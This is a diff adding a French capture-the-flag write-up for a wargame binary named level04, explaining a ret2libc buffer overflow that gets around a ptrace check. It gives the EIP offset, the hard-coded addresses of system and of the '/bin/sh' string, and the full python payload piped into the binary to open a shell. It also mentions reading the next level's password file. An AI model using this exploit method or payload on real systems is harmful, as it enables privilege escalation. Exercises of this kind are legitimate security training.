@@ -16,3 +16,50 @@ addr system = 0xf7e6aed0
 On remplit notre buffer puis on ecrase EIP par ladresse de system et on ecris 4 octet apres l'adresse de /bin/sh
 
 (python -c 'print("\x90" * 156 + "\xd0\xae\xe6\xf7" + "HACK" + "\xec\x97\xf8\xf7")'; cat) | ./level04 
+
+================================================================================
+
+Dans ce binaire, nous pouvons ecraser EIP mais nou ne pouvons pas lancer de shellcode.
+
+Il y a une fonction (ptrace) qui check si un execve est fait. Si c'est le cas,
+le programme exit.
+
+Pas de shellcode possible.
+
+Une solution est d'ecraser EIP par l'adresse d'une fonction de la libc par exemple : system.
+
+Nous avons donc EIP a l'offset 156.
+
+On doit recuperer l'adresse de system.
+gdb ./level04 ; start; p system
+
+Nous avons notre adresse avec laquelle nous ecraserons EIP.
+
+Maintenant il faut lui passer un argument.
+
+Nous pouvons directement passer la commande "cat /home/users/level5/.pass" ou
+"/bin/sh" pour lancer un shell.
+
+La deuxieme solution sera plus simple.
+
+On doit recuperer l'adresse de la string /bin/bash ou sh ou un autre shell.
+
+Nous avons une variable d'environement qui contient justement cette string.
+
+Il faut recuperer l'adresse et l'ecrire 4 octets plus loin.
+
+Avec peda on utilise searchmem pour trouver l'emplacement de la string.
+
+searchmem "/bin/sh"
+
+Nous avons notre adresse.
+
+Notre payload ressemblera a ca :
+
+python -c 'print("\x90" * size to reach EIP + "\xd0\xae\xe6\xf7" + "XOXO" + "\xec\x97\xf8\xf7")'
+
+Nous devons garder l'execution du programme avec un cat.
+
+(notre payload ; cat) | ./level04
+
+Nous avons notre shell
